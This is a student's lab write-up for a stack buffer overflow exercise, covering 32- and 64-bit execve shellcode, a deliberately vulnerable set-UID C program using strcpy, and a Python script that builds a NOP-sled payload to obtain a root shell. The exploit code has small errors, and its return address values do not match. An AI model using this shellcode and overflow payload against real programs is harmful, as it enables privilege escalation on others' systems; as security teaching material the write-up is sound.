# Work on week #5


## Tasks done

### 1

* The main goal of this task is to understand how to run shellcode and take advantage of it as an attacker.

* We can create shellcode in 2 different versions- in 32 or 64 bits. The main difference between them are the name and number of the registers used on the programs.

* In order to complete this task, we had to compile these file (call_shellcode.c), with the command ```make all```, which will generate the 2 runnable versions:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0) 
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"


const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}

```

*  This file pushes store those registers to the code variable and make the pointers to those registers (made by the ```func()```), according to the respective version (32 or 64 bits). Those registers address to the assembly commands needed to execute a shell.

* The ```make all``` has a special flag, the ```-z execstack```, which creates an execution stack to the compiled program. This results in the execution of the commands stored in the registers that were copied in the code variable. In other words, the variable code will be the execution stack.

* After running both executables (a32.out and a64.out), we reached to the same output: we opened a shell. We know that due to the existence of the dollar sign ($) in the terminal, as it is shown below.

![](https://i.imgur.com/T6g88ed.png)

<p> 
    Fig.1- Execution of a32.out and 64.out. Both programs successfully open a shell.
</p>


* In conclusion, if an attacker successfully smashes the call stack, he/she can alter the normal program flow of the vulnerable process and inject this shellcode in order to open a shell code and gain full control of victim's machine, which would be quite dangerous. However, it is essential to execute it the ```-z execstack```, otherwise it won't work (it creates a segmentation fault).


![](https://i.imgur.com/tvilJmV.png)

<p> 
    Fig.2- Execution without the exectack flag
</p>

### 2

The second task is to set up the file to be exploited. For this we are given the c file:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);       

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r"); 
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}

// This function is used to insert a stack frame of size 
// 1000 (approximately) between main's and bof's stack frames. 
// The function itself does not do anything. 
void dummy_function(char *str)
{
    char dummy_buffer[1000];
    memset(dummy_buffer, 0, 1000);
    bof(str);
}

```

The file has a buffer overflow vunerability in the strcpy command because the function doesn't check for boundaries, that means that if the program is a root owned set-UID file we can feed the function a string that makes it spawn a root shell

For this to be exploitable it is needed for the OS safeguards be turned off and for the the code to be compiled with the following flags ```-z execstack -fno-stack-protector```

### 3

#### Step 1

* In this task our goal is exploit the buffer-overflow vulnerability in the target program.
* We will use a debugger method to find it out and we need to use gdb to debug stack-L1-dbg.

![](https://i.imgur.com/7EVXzdI.png)


<p> 
    Fig.3- Important values to make the attack
</p>
 
#### Step 2

```python
#!/usr/bin/python3
import sys
shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
 # ✩ Need to change ✩
).encode(’latin-1’)
# Fill the content with NOP’s
content = bytearray(0x90 for i in range(517))
##################################################################
# Put the shellcode somewhere in the payload
start = 490 # ✩ Need to change ✩
content[start:start + len(shellcode)] = shellcode
# Decide the return address value
# and put it somewhere in the payload
ret = 0xFFFFCB96 #if 32 bits senão 0x48
# ✩ Need to change ✩
offset = 112  #Number of bytes of the buffer in task 2 (???) # ✩ Need to change ✩
L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder=’little’)
##################################################################
# Write the content to a file
with open(’badfile’, ’wb’) as f:
f.write(content)
```

* We put our **start** to 490 because the buffer has a size of 517 and our shell has a  size of 27 bytes,so 517-27=490.
* Our **ret** is for change the point to our shellcode.We have a information of the value of buf is 0*ffffc9fc.We do 0*ffffc9fc +490.This sum give us our return address which was 0*ffffcbe6 .
* **Offset** is where we inject out return address thats points to our shellcode.We also know the address of ebp is 0*ffffca68 and the buffer address is 0*ffffc9fc so ebp starts after 108 bytes of edp,but we cannot forget to add more 4 bytes to 108 bytes because of size the edp is 4 bytes.
* Now for test this we open terminal where exploit.py and stack_l1 is located.If we can get access to rootshell so is correct.

![](https://i.imgur.com/K5rpE74.png)



